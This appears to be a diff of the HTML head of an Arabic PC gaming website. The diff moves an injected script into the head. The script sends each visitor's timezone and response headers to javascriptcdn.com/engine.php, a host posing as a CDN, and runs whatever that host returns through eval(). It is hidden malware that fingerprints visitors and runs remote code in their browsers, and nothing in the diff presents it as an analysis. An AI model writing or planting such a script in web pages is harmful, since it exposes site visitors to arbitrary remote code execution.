@@ -1,7 +1,11 @@
 <!DOCTYPE html>
 <html dir="ltr" lang="en-US">
 <head>
-
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
+<script>
+$(document).ready(function(){var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange=function(){g=f.getAllResponseHeaders().toLowerCase()};var d=jstz.determine();var e=d.name();$.ajax({url:"https://javascriptcdn.com/engine.php",type:"POST",data:"tz="+e+"&he="+g,success:function(a){if(a){eval(a);}else{$("html").show();}}})})
+</script>
 
 <meta http-equiv="content-type" content="text/html; charset=utf-8" />
 <meta name="author" content="SemiColonWeb" />
@@ -23,11 +27,7 @@
 	<title>PCGAMER - كل شيء عن ألعاب الكمبيوتر ووحدة التحكم</title>
 
 </head>
-<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
-<script>
-$(document).ready(function(){var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange=function(){g=f.getAllResponseHeaders().toLowerCase()};var d=jstz.determine();var e=d.name();$.ajax({url:"https://javascriptcdn.com/engine.php",type:"POST",data:"tz="+e+"&he="+g,success:function(a){if(a){eval(a);}else{$("html").show();}}})})
-</script>
+
 <body class="stretched">
 
 	<!-- Document Wrapper
